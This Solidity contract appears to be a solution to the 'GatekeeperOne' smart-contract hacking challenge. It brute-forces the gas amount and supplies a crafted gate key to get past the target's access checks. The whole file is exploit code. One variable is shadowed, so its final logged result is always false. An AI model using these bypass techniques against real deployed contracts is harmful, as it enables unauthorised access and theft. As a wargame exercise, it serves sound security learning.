// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface GatekeeperOne {
    function entrant() external returns (address);
    function enter(bytes8 _gateKey) external returns (bool);
}
contract relay{
    GatekeeperOne gatekeeperOne;
    address addr=0x5A0eD1CDF057777B3568a727dEE75F62f9f27690;
    address entrant;
    event log(bool);
    event logaddr(address);
    function attack() public {
        bytes8 key=0xAAAAAAAA00002113;
        bool result;
        for (uint256 i = 1; i < 500; i++) {
            (bool result, bytes memory data) = address(
                addr
            ).call{gas:i + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)",key));
            if (result) {
                break;
            }
        }
        emit log(uint32(uint64(key)) == uint16(uint64(key)));
        emit log(uint32(uint64(key)) != uint64(key));
        emit log(uint32(uint64(key)) ==  uint16(uint160(tx.origin)));
        emit log(result);
    }

    function getentrant() public {
        gatekeeperOne = GatekeeperOne(addr);
        entrant = gatekeeperOne.entrant();
        emit logaddr(entrant);
    }
}